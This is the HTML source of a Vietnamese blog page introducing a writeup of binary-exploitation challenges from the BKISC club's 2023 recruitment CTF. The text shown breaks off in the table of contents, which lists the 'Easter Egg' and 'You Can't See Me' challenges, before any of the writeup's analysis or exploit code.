<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  <title>BKISC Recruitment CTF - PWN writeup &middot; RToSI</title>
    <meta name="title" content="BKISC Recruitment CTF - PWN writeup &middot; RToSI">

  
  <meta name="description" content="Writeup cho các thử thách mảng pwnable của giải CTF tuyển quân CLB ATTT BKISC.">
  <meta name="keywords" content="ctf,pwn,BKISC,2023,">
  
  
  <link rel="canonical" href="/writeup/bkisc_recruit/">
  
  
  
  
  
  
  
  
  
    
  
  
    
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.f309b0ea71172f67a60fe9e13727c14b89532294c58ad6ebc98163e8caba3f8c93ee441e2cfe0b4ce34f4109e5493c605b9668550adca3693bbdaca58d9390ff.css"
    integrity="sha512-8wmw6nEXL2emD&#43;nhNyfBS4lTIpTFitbryYFj6Mq6P4yT7kQeLP4LTONPQQnlSTxgW5ZoVQrco2k7vayljZOQ/w==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.5bb1fc48c4ae6b4006a0f03f158901719290d0692aa62c65a75152ff54d062dda84af215c7b8b14916a7380561485bc068321598fb6bdeca2f088e9a4d994dae.js"
    integrity="sha512-W7H8SMSua0AGoPA/FYkBcZKQ0Gkqpixlp1FS/1TQYt2oSvIVx7ixSRanOAVhSFvAaDIVmPtr3sovCI6aTZlNrg=="></script>
  
    
    
    
  
  
    
    
  
  
  
  
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.0949866a3775665e3328cc9f6538c03410adef5f4793bc4963962f3073cc855e57624f12c27567e0d2f33c3ac421873f32f56a24b2efae56619cea2d9655d2c7.js"
      integrity="sha512-CUmGajd1Zl4zKMyfZTjANBCt719Hk7xJY5YvMHPMhV5XYk8SwnVn4NLzPDrEIYc/MvVqJLLvrlZhnOotllXSxw=="
      data-copy="Copy"
      data-copied="Copied"></script>
  
  
    
    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
  

  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  
  
  
  
  

  
  <meta property="og:url" content="/writeup/bkisc_recruit/">
  <meta property="og:site_name" content="RToSI">
  <meta property="og:title" content="BKISC Recruitment CTF - PWN writeup">
  <meta property="og:description" content="Writeup cho các thử thách mảng pwnable của giải CTF tuyển quân CLB ATTT BKISC.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeup">
    <meta property="article:published_time" content="2023-11-11T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-11-11T00:00:00+00:00">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="BKISC">
    <meta property="article:tag" content="2023">
    <meta property="og:image" content="/writeup/bkisc_recruit/featured.jpg">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="/writeup/bkisc_recruit/featured.jpg">
  <meta name="twitter:title" content="BKISC Recruitment CTF - PWN writeup">
  <meta name="twitter:description" content="Writeup cho các thử thách mảng pwnable của giải CTF tuyển quân CLB ATTT BKISC.">
<meta name="twitter:image" content="/writeup/bkisc_recruit/featured.jpg">
    <meta property="og:image" content="/writeup/bkisc_recruit/featured.jpg">
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Writeups",
    "name": "BKISC Recruitment CTF - PWN writeup",
    "headline": "BKISC Recruitment CTF - PWN writeup",
    
    "abstract": "Writeup cho các thử thách mảng pwnable của giải CTF tuyển quân CLB ATTT BKISC.",
    "inLanguage": "en",
    "url" : "\/writeup\/bkisc_recruit\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-11-11T00:00:00\u002b00:00",
    "datePublished": "2023-11-11T00:00:00\u002b00:00",
    
    "dateModified": "2023-11-11T00:00:00\u002b00:00",
    
    "keywords": ["ctf","pwn","BKISC",2023],
    
    "mainEntityOfPage": "true",
    "wordCount": "2997"
  }]
  </script>



  
  
  

  
  

<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>























  
  





  
  

  
  

  
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
      >
    </div>
    
    
      











<div
  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
  
  
    
    
      <div>
        <a href="/" class="flex">
          <span class="sr-only">RToSI</span>
          
            <img
              src="/img/image.png"
              width="231"
              height="170"
              class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom"
              alt="RToSI">
          
        </a>
      </div>
    

  <div class="flex flex-1 items-center justify-between">
    <nav class="flex space-x-3">
      
        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
          RToSI
        </a>
      
    </nav>
    
  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
    
      
        
  <a
  href="/sharing/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Sharings">
    Sharing
  </p>
</a>



      
        
  <a
  href="/writeup/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Writeups">
    Writeup
  </p>
</a>



      
        
  <a
  href="/authors/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Authors">
    Members
  </p>
</a>



      
        
  <a
  href=""
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



      
    

    


    
      <button
        id="search-button"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


      </button>
    

    
      <div class=" flex items-center">
        <button
          id="appearance-switcher"
          aria-label="Dark mode switcher"
          type="button"
          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
          <div class="flex items-center justify-center dark:hidden">
            

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


          </div>
          <div class="items-center justify-center hidden dark:flex">
            

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


          </div>
        </button>
      </div>
    
  </nav>

    
  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
    <span></span>

    

    
      <button
        id="search-button-mobile"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


      </button>
    

    
      <button
        id="appearance-switcher-mobile"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
        <div class="flex items-center justify-center dark:hidden">
          

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


        </div>
        <div class="items-center justify-center hidden dark:flex">
          

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


        </div>
      </button>
    
  </div>

  </div>
  
  <div class="-my-2 md:hidden">
    <div id="menu-button" class="block">
      
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


        </div>
        <div
          id="menu-wrapper"
          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
          <ul
            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
            <li id="menu-close-button">
              <span
                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


              </span>
            </li>

            
              
  <li class="mt-1">
  <a
    href="/sharing/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Sharings">
      Sharing
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/writeup/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Writeups">
      Writeup
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/authors/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Authors">
      Members
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href=""
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>



            

          </ul>
          
        </div>
      
    </div>
  </div>

</div>





    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  


  <article>
    
      
      
      
      
        


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/writeup/bkisc_recruit/featured_hu_1460e52645268422.jpg);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>


<script type="text/javascript" src="/js/background-blur.min.bb6c0bc3c9ae6bfefd8feea60472225f7e295b703295fea46750ec2dba80f6a7d39b8dcb139e26ef2aef48e7de2d69f4e4232e8d2782ad1101fc09ee47fe76a7.js" integrity="sha512-u2wLw8mua/79j&#43;6mBHIiX34pW3Aylf6kZ1DsLbqA9qfTm43LE54m7yrvSOfeLWn05CMujSeCrREB/AnuR/52pw==" data-target-id="background-blur"></script>

      
    


    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        BKISC Recruitment CTF - PWN writeup
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2023-11-11T00:00:00&#43;00:00">11 November 2023</time><span class="px-2 text-primary-500">&middot;</span><span>2997 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ctf/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ctf
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/pwn/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Pwn
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/bkisc/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    BKISC
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/2023/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    2023
  </span>
</span>
</a
              >
            
          
        
      
    </div>
  

  
  



      </div>

      
      
      
      
      

      

      

        

        
          
              
            
              
                
              
            

            
            
            
              
            

            
<div class="flex author author-extra mt-4">
  
    
    
      
        
      
      <img
        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
        width="96"
        height="96"
        src="/img/lio_hu_ae43c20791816089.png">
    
  
  <div class="place-self-center">
    
    
      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
      <a
        href="/authors/lio/"
        class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        Lio
      </a>
    
    
      <div class="text-sm text-neutral-700 dark:text-neutral-400">Trying to exploit this shell program called life that I never get control of.</div>
    
    <div class="text-2xl sm:text-lg">
      <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
        
          
            <a
              class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
              href="https://www.facebook.com/Sophia.Is.My.World"
              target="_blank"
              aria-label="Facebook"
              rel="me noopener noreferrer"
              ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>

  </span>

</span></a
            >
          
        
          
            <a
              class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
              href="https://twitter.com/bentnt1982"
              target="_blank"
              aria-label="Twitter"
              rel="me noopener noreferrer"
              ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>

  </span>

</span></a
            >
          
        
          
            <a
              class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
              href="https://github.com/th4s1s"
              target="_blank"
              aria-label="Github"
              rel="me noopener noreferrer"
              ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
            >
          
        
          
            <a
              class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
              href="mailto:bentnt1982@gmail.com"
              target="_blank"
              aria-label="Email"
              rel="me noopener noreferrer"
              ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>

  </span>

</span></a
            >
          
        
      </div>
    </div>
  </div>
</div>


        
          <div class="mb-5"></div>
        

      

    </header>

    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
          <div
            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky 
              lg:top-10
            
            ">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#easter-egg">Easter Egg</a>
          <ul>
            <li><a href="#setup">Setup</a></li>
            <li><a href="#phân-tích-source-code">Phân tích source code</a></li>
            <li><a href="#lên-kịch-bản-khai-thác">Lên kịch bản khai thác</a></li>
            <li><a href="#tiến-hành-debug">Tiến hành debug</a></li>
            <li><a href="#điểm-bất-thường-của-chương-trình">Điểm bất thường của chương trình</a></li>
            <li><a href="#lên-kịch-bản-khai-thác-lần-2">Lên kịch bản khai thác lần 2</a></li>
            <li><a href="#viết-script-khai-thác">Viết script khai thác</a></li>
          </ul>
        </li>
        <li><a href="#you-cant-see-me">You Can&rsquo;t See Me</a>
          <ul>
            <li><a href="#setup-1">Setup</a></li>
            <li><a href="#phân-tích-source-code-1">Phân tích source code</a></li>
            <li><a href="#lên-kịch-bản-khai-thác-1">Lên kịch bản khai thác</a></li>
            <li><a href="#tiến-hành-debug-1">Tiến hành debug</a></li>
            <li><a href="#viết-script-khai-thác-1">Viết script khai thác</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#easter-egg">Easter Egg</a>
          <ul>
            <li><a href="#setup">Setup</a></li>
            <li><a href="#phân-tích-source-code">Phân tích source code</a></li>
            <li><a href="#lên-kịch-bản-khai-thác">Lên kịch bản khai thác</a></li>
            <li><a href="#tiến-hành-debug">Tiến hành debug</a></li>
            <li><a href="#điểm-bất-thường-của-chương-trình">Điểm bất thường của chương trình</a></li>
            <li><a href="#lên-kịch-bản-khai-thác-lần-2">Lên kịch bản khai thác lần 2</a></li>
            <li><a href="#viết-script-khai-thác">Viết script khai thác</a></li>
          </ul>
        </li>
        <li><a href="#you-cant-see-me">You Can&rsquo;t See Me</a>
          <ul>
            <li><a href="#setup-1">Setup</a></li>
